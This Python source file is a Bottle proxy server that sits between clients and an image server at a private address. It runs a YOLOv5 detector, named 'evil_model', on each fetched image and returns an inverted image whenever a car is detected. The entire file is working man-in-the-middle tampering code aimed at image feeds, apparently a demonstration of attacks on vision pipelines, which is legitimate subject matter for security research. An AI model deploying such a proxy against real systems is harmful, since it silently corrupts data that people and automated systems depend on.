from bottle import route, response, run

import cv2
import httpx
import numpy as np


from model import YOLOv5

TARGET_CLASSES = [
    "car",
]

evil_model = YOLOv5()


def moditm(path):
    server_ip = "192.168.1.222"
    forwarding_uri = f"http://{server_ip}{path}?"
    resp = httpx.get(forwarding_uri)
    img_bytes = resp.content

    image = np.asarray(bytearray(img_bytes), dtype="uint8")
    image = cv2.imdecode(image, cv2.IMREAD_COLOR)

    result = evil_model.detect(image)

    if set(result["name"].tolist()).intersection(set(TARGET_CLASSES)):
        img_bytes = invert_img(image)
    response.set_header("Content-type", "image/jpeg")
    return img_bytes


def invert_img(image):
    image = cv2.bitwise_not(image)
    neg_bytes = cv2.imencode(".jpg", image)[1].tostring()
    return neg_bytes


@route("/image_one")
def execute_moditm():
    path = "/image_one"
    return moditm(path)


@route("/image_two")
def execute_moditm():
    path = "/image_two"
    return moditm(path)


@route("/image_three")
def execute_moditm():
    path = "/image_three"
    return moditm(path)


@route("/image_four")
def execute_moditm():
    path = "/image_four"
    return moditm(path)


@route("/image_five")
def execute_moditm():
    path = "/image_five"
    return moditm(path)


@route("/image_six")
def execute_moditm():
    path = "/image_six"
    return moditm(path)


@route("/image_seven")
def execute_moditm():
    path = "/image_seven"
    return moditm(path)


@route("/image_eight")
def execute_moditm():
    path = "/image_eight"
    return moditm(path)


@route("/image_nine")
def execute_moditm():
    path = "/image_nine"
    return moditm(path)


run(host="0.0.0.0", port=5000, debug=True)
